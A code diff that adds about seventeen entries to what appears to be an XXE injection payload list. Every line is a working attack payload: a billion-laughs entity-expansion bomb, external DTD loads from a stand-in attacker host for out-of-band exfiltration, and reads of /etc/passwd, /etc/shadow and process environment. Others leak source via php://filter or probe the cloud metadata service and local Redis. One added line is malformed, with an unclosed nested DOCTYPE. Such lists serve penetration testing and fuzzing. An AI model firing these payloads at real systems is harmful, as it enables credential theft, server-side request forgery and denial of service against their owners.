@@ -1,5 +1,22 @@
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>
 <!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]> <r>&xxe;</r>
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]> <r>&xxe;</r>
 <!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]> <r>&xxe;</r>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY % a SYSTEM "http://attacker.com/evil.dtd">%a;]><data>&b;</data>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>&exfil;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com:2121/x">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_info">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><foo/>
